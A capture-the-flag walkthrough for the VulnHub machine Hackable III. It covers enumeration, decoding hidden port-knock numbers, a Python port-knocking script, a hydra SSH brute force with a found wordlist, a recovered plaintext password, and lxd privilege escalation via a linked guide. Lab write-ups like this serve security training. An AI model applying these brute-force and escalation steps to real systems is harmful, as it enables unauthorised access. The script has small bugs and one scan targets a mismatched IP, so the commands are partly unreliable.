<!--Getting root and final flag isn't very clear. Should try to debug and see why it didn't work-->

Target: 10.0.0.34
Difficulty: Medium
Source: https://www.vulnhub.com/entry/hackable-iii,720/

## ***NMAP***

    $ nmap -sS -A -T4 -p- 10.0.0.17

    PORT   STATE    SERVICE                                                                                   
    22/tcp filtered ssh
    80/tcp open     http

Port 22 (SSH) is filtered on the machine, let's enumerate HTTP and try to find a way to gain access to the port.

## ***HTTP***

![image](https://user-images.githubusercontent.com/76552238/158249984-ff05cbbe-3eb1-4841-a3f6-d07729adb41e.png)

Found a comment on http://10.0.0.34:

![image](https://user-images.githubusercontent.com/76552238/158249918-4fa38e66-0c08-4d4e-a207-63f7ef812906.png)

<!-- "Please, jubiscleudo, don't forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com" -->

We can infer that 'jubiscleudo' is a username on the machine. The comment stats that the machine is using Port Knocking (Port Knocking is a method of externally opening ports on a machine by generating a connection attempt on a set of prespecified ports. Unless the attacker send the correct knock sequence, the protected ports will appear closed, or in our case filtered).

The comment also mentioned that there is a JPG file that hold information.

    $ gobuster dir -u http://10.0.0.34 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x html,bak,zip,txt,jpg

    /3.jpg                (Status: 200) [Size: 61259]
    /robots.txt           (Status: 200) [Size: 33]   
    /config               (Status: 301) [Size: 307] [--> http://10.0.0.34/config/]
    /css                  (Status: 301) [Size: 304] [--> http://10.0.0.34/css/]   
    /js                   (Status: 301) [Size: 303] [--> http://10.0.0.34/js/]    
    /imagens              (Status: 301) [Size: 308] [--> http://10.0.0.34/imagens/]
    /backup               (Status: 305) [Size: 305] [--> http://10.0.0.34/backup/]

We found the JPG that was mentioned in the comment. After downloading it to our local machine, I tried using the 'strings' command to see if the the content of the file holds any secret information but it didn't work.
I used the command 'steghide' to see if the file has any embedded files.

    $ steghide extract -sf 3.jpg

![image](https://user-images.githubusercontent.com/76552238/158250613-101a90b9-861c-4cf5-ac22-911b9a59d0dc.png)

> ### ***steganopayload148505.txt:*** 

    port:65535

**We found the first port!!!**

The /config directory on http://10.0.0.34 has a txt file.

![image](https://user-images.githubusercontent.com/76552238/158250789-192f977d-50f4-4232-89bb-7c4f6cfa24c3.png)

> 
> ### ***http://10.0.0.34/config/1.txt:***

![image](https://user-images.githubusercontent.com/76552238/158250829-0af720a7-b5f4-4655-b10b-082b963497eb.png)

![image](https://user-images.githubusercontent.com/76552238/158250975-279ba006-d636-4112-90e4-b34582965383.png)

Base64 decode: 10000

We found another port.

Going to the /backup directory we found a wordlist that we will probably use to brute force using the username we found.

![image](https://user-images.githubusercontent.com/76552238/158251252-7345034c-044b-4234-9dce-397278f3312b.png)

> ### ***http://10.0.0.34/backup/wordlist.txt:***

    123456
    12345
    123456789
    password
    iloveyou
    princess
    1234567
    rockyou
    12345678
    abc123
    nicole
    daniel
    babygirl
    monkey
    lovely
    jessica
    654321
    michael
    ashley
    qwerty
    111111
    iloveu
    000000
    michelle
    tigger
    sunshine
    chocolate
    password1
    soccer
    anthony
    friends
    butterfly
    purple
    angel
    jordan
    liverpool
    justin
    loveme
    fuckyou
    123123
    football
    secret
    andrea
    carlos
    jennifer
    joshua
    bubbles
    1234567890
    superman
    hannah
    amanda
    loveyou
    pretty
    basketball
    andrew
    angels
    tweety
    flower
    playboy
    hello
    elizabeth
    hottie
    tinkerbell
    charlie
    samantha
    barbie
    chelsea
    lovers
    teamo
    jasmine
    brandon
    666666
    shadow
    melissa
    eminem
    matthew
    robert
    danielle
    forever
    family
    jonathan
    987654321
    computer
    whatever
    dragon
    vanessa
    cookie
    naruto
    summer
    sweety
    spongebob
    joseph
    junior
    softball
    taylor
    yellow
    daniela
    lauren
    mickey
    princesa
    alexandra
    alexis
    jesus
    estrella
    miguel
    william
    thomas
    beautiful
    mylove
    angela
    poohbear
    patrick
    iloveme
    sakura
    adrian
    alexander
    destiny
    christian
    121212
    sayang
    america
    dancer
    monica
    richard
    112233
    princess1
    555555
    diamond
    carolina
    steven
    rangers
    louise
    orange
    789456
    999999
    shorty
    11111
    nathan
    snoopy
    gabriel
    hunter
    cherry
    killer
    sandra
    alejandro
    buster
    george
    brittany
    alejandra
    patricia
    rachel
    tequiero
    7777777
    cheese
    159753
    arsenal
    dolphin
    antonio
    heather
    david
    ginger
    stephanie
    peanut
    blink182
    sweetie
    222222
    beauty
    987654
    victoria
    honey
    00000
    fernando
    pokemon
    maggie
    corazon
    chicken
    pepper
    cristina
    rainbow
    kisses
    manuel
    myspace
    rebelde
    angel1
    ricardo
    babygurl
    heaven
    55555
    baseball
    martin
    greenday
    november
    alyssa
    madison
    mother
    123321
    123abc
    mahalkita
    batman
    september
    december
    morgan
    mariposa
    maria
    onlymy
    gabriela
    iloveyou2
    bailey
    jeremy
    pamela
    kimberly
    gemini
    shannon
    pictures
    asshole
    sophie
    jessie
    hellokitty
    claudia
    babygirl1
    angelica
    austin
    mahalko
    victor
    horses
    tiffany
    mariana
    eduardo
    andres
    courtney
    booboo
    kissme
    harley
    ronaldo
    iloveyou1
    precious
    october
    inuyasha
    peaches
    veronica
    chris
    888888
    adriana
    cutie
    james
    banana
    prince
    friend
    jesus1
    crystal
    celtic
    zxcvbnm
    edward
    oliver
    diana
    samsung
    freedom
    angelo
    kenneth
    master
    scooby
    carmen
    456789
    sebastian
    rebecca
    jackie
    spiderman
    christopher
    karina
    johnny
    hotmail
    0123456789
    school
    barcelona
    august
    orlando
    samuel
    cameron
    slipknot
    cutiepie
    monkey1
    50cent
    bonita
    kevin
    bitch
    maganda
    babyboy
    casper
    brenda
    adidas
    kitten
    karen
    mustang
    isabel
    natalie
    cuteako
    javier
    789456123
    123654
    sarah

We can find **2.txt** in /css:

![image](https://user-images.githubusercontent.com/76552238/158251639-a85b799d-e46b-4ef3-b322-b0b0bda63073.png)

### ***http://10.0.0.34/css/2.txt:***

    ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>------------------....

We found a BrainF*ck code.

> ### ***Brainf*ck Execute:*** 4444

We found the final port.

We have the ports [65535,10000,4444] we can perform Port Knocking on the machine and open port 22 (SSH).

I wrote this Python script that generates all combinations for the 3 ports and knocks on them.

> ### ***portKnocker.py:***

	import os
	import socket
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	IP = "10.0.0.34"
	SSH = 22
	target_ip = socket.gethostbyname(IP)
	ports = [10000 ,4444 ,65535]
	
	def knock(arr):
	    for p in ports:
 			os.system("telnet " + str(IP) + " " + str(p))
	
	def scanPort(port):
	    try:
	        s.connect((target_ip, port))
	        return True
	    except:
	        return False
	
	def isHostUp(ip):
	    response = os.popen(f"ping -n 1 -w 2 " + ip).read()
	    if "Received = 1" in response:
	        return True
	    return False
	
	def swap(arr, i, j):
	    temp = arr[i]
	    arr[i] = arr[j]
	    arr[j] = temp
	
	def possiblePermutations(arr, index):
	    if scanPort(SSH) == True:
	        print("[+] SSH is up\nCorrent Squence: ")
	        print(arr)
	        return
	    
	    if index == 1:
	        print(arr)
	        knock(arr)
	    else:
	        for i in range(index - 1):
	            possiblePermutations(arr, index -1)
	
	            if(index % 2 == 0):
	                swap(arr, i, index - 1)
	            else:
	                swap(arr, 0, index -1)
	        
	        possiblePermutations(arr, index - 1)
	
	if(isHostUp(target_ip)):
	    print("[+] Scanning "  + target_ip + "...") # Check if host is up and can be scanned
	
	    possiblePermutations(ports, len(ports))
	    
	else:
	    print("Host Is Not Up!")
	

We can also use the command 'knock'.

    $ nmap -T5 -p22 10.0.0.34

![image](https://user-images.githubusercontent.com/76552238/158252286-e1afea45-adf6-47c8-8bc7-54f0cd963950.png)

After running the script we can use NMAP to scan the machine again and see that port 22 is open.  
After port knocking we can brute force SSH with the wordlist that we found and the username 'jubiscleudo'.

    $ hydra -l 'jubiscleudo' -P wordlist.txt ssh://10.0.0.34 -V -I

![image](https://user-images.githubusercontent.com/76552238/158252703-888fa252-4a35-430a-8b57-ed4dbd5b52f5.png)

Once we are logged in we can read the flag '**.user.txt**' on the home folder.

> ### ***.user.txt:***

![image](https://user-images.githubusercontent.com/76552238/158252875-492626ff-1fe2-41e4-acde-16390ef6d45d.png)

## ***PRIVILEGE ESCALATION***

Let's see if there are more users on the machine.

    $ cat /etc/passwd | grep /bin/bash

    root:x:0:0:root:/root:/bin/bash
    hackable_3:x:1000:1000:hackable_3:/home/hackable_3:/bin/bash
    jubiscleudo:x:1001:1001:,,,:/home/jubiscleudo:/bin/bash

There is another user on the machine named '**hackable_3**'.

Going to ***/var/www/html***, we can find the file ***.backup_config.php***:

![image](https://user-images.githubusercontent.com/76552238/158253164-5c60e96b-a03e-4777-9a0d-ca8ddecf74b1.png)

![image](https://user-images.githubusercontent.com/76552238/158253213-ca037eb8-2006-41c2-aad2-b856cbe9eb4d.png)

<!--hackable_3:TrOLLED_3-->

We can now switch to the user 'hackable_3'.

![image](https://user-images.githubusercontent.com/76552238/158253491-e54c3979-20f9-4b4d-ab1e-f125489458c3.png)

Let's try to find SUID files.

    $ find / -perm /4000 2> /dev/null

    /usr/bin/gpasswd
    /usr/bin/fusermount
    /usr/bin/chfn
    /usr/bin/newgrp
    /usr/bin/chsh
    /usr/bin/umount
    /usr/bin/su
    /usr/bin/pkexec
    /usr/bin/mount
    /usr/bin/passwd
    /usr/bin/sudo
    /usr/lib/snapd/snap-confine
    /usr/lib/openssh/ssh-keysign
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/libexec/polkit-agent-helper-1
    /snap/core20/1376/usr/bin/chfn
    /snap/core20/1376/usr/bin/chsh
    /snap/core20/1376/usr/bin/gpasswd
    /snap/core20/1376/usr/bin/mount
    /snap/core20/1376/usr/bin/newgrp
    /snap/core20/1376/usr/bin/passwd
    /snap/core20/1376/usr/bin/su
    /snap/core20/1376/usr/bin/sudo
    /snap/core20/1376/usr/bin/umount
    /snap/core20/1376/usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /snap/core20/1376/usr/lib/openssh/ssh-keysign
    /snap/core20/1026/usr/bin/chfn
    /snap/core20/1026/usr/bin/chsh
    /snap/core20/1026/usr/bin/gpasswd
    /snap/core20/1026/usr/bin/mount
    /snap/core20/1026/usr/bin/newgrp
    /snap/core20/1026/usr/bin/passwd
    /snap/core20/1026/usr/bin/su
    /snap/core20/1026/usr/bin/sudo
    /snap/core20/1026/usr/bin/umount
    /snap/core20/1026/usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /snap/core20/1026/usr/lib/openssh/ssh-keysign
    /snap/snapd/14978/usr/lib/snapd/snap-confine
    /snap/core18/2284/bin/mount
    /snap/core18/2284/bin/ping
    /snap/core18/2284/bin/su
    /snap/core18/2284/bin/umount
    /snap/core18/2284/usr/bin/chfn
    /snap/core18/2284/usr/bin/chsh
    /snap/core18/2284/usr/bin/gpasswd
    /snap/core18/2284/usr/bin/newgrp
    /snap/core18/2284/usr/bin/passwd
    /snap/core18/2284/usr/bin/sudo
    /snap/core18/2284/usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /snap/core18/2284/usr/lib/openssh/ssh-keysign
    /snap/core18/2074/bin/mount
    /snap/core18/2074/bin/ping
    /snap/core18/2074/bin/su
    /snap/core18/2074/bin/umount
    /snap/core18/2074/usr/bin/chfn
    /snap/core18/2074/usr/bin/chsh
    /snap/core18/2074/usr/bin/gpasswd
    /snap/core18/2074/usr/bin/newgrp
    /snap/core18/2074/usr/bin/passwd
    /snap/core18/2074/usr/bin/sudo
    /snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /snap/core18/2074/usr/lib/openssh/ssh-keysign

Trying to find a SUID file brings some odd results, files in the directory 'snap' have SUID permissions. Going to the /snap/bin directory we can see that the commands '***lxc***' and '***lxd***' are installed.

I searched for '***lxd privialge escliation***' and found this article. It goes by step by step on how to get a root shell using lxd.

Follow the steps on https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

> ### ***root.txt ***

    ░░█▀░░░░░░░░░░░▀▀███████░░░░
    ░░█▌░░░░░░░░░░░░░░░▀██████░░░
    ░█▌░░░░░░░░░░░░░░░░███████▌░░
    ░█░░░░░░░░░░░░░░░░░████████░░
    ▐▌░░░░░░░░░░░░░░░░░▀██████▌░░
    ░▌▄███▌░░░░▀████▄░░░░▀████▌░░
    ▐▀▀▄█▄░▌░░░▄██▄▄▄▀░░░░████▄▄░
    ▐░▀░░═▐░░░░░░══░░▀░░░░▐▀░▄▀▌▌
    ▐░░░░░▌░░░░░░░░░░░░░░░▀░▀░░▌▌
    ▐░░░▄▀░░░▀░▌░░░░░░░░░░░░▌█░▌▌
    ░▌░░▀▀▄▄▀▀▄▌▌░░░░░░░░░░▐░▀▐▐░
    ░▌░░▌░▄▄▄▄░░░▌░░░░░░░░▐░░▀▐░░
    ░█░▐▄██████▄░▐░░░░░░░░█▀▄▄▀░░
    ░▐░▌▌░░░░░░▀▀▄▐░░░░░░█▌░░░░░░
    ░░█░░▄▀▀▀▀▄░▄═╝▄░░░▄▀░▌░░░░░░
    ░░░▌▐░░░░░░▌░▀▀░░▄▀░░▐░░░░░░░
    ░░░▀▄░░░░░░░░░▄▀▀░░░░█░░░░░░░
    ░░░▄█▄▄▄▄▄▄▄▀▀░░░░░░░▌▌░░░░░░
    ░░▄▀▌▀▌░░░░░░░░░░░░░▄▀▀▄░░░░░
    ▄▀░░▌░▀▄░░░░░░░░░░▄▀░░▌░▀▄░░░
    ░░░░▌█▄▄▀▄░░░░░░▄▀░░░░▌░░░▌▄▄
    ░░░▄▐██████▄▄░▄▀░░▄▄▄▄▌░░░░▄░
    ░░▄▌████████▄▄▄███████▌░░░░░▄
    ░▄▀░██████████████████▌▀▄░░░░
    ▀░░░█████▀▀░░░▀███████░░░▀▄░░
    ░░░░▐█▀░░░▐░░░░░▀████▌░░░░▀▄░
    ░░░░░░▌░░░▐░░░░▐░░▀▀█░░░░░░░▀
    ░░░░░░▐░░░░▌░░░▐░░░░░▌░░░░░░░
    ░╔╗║░╔═╗░═╦═░░░░░╔╗░░╔═╗░╦═╗░
    ░║║║░║░║░░║░░░░░░╠╩╗░╠═╣░║░║░
    ░║╚╝░╚═╝░░║░░░░░░╚═╝░║░║░╩═╝░

    invite-me: linkedin.com/in/eliastouguinho
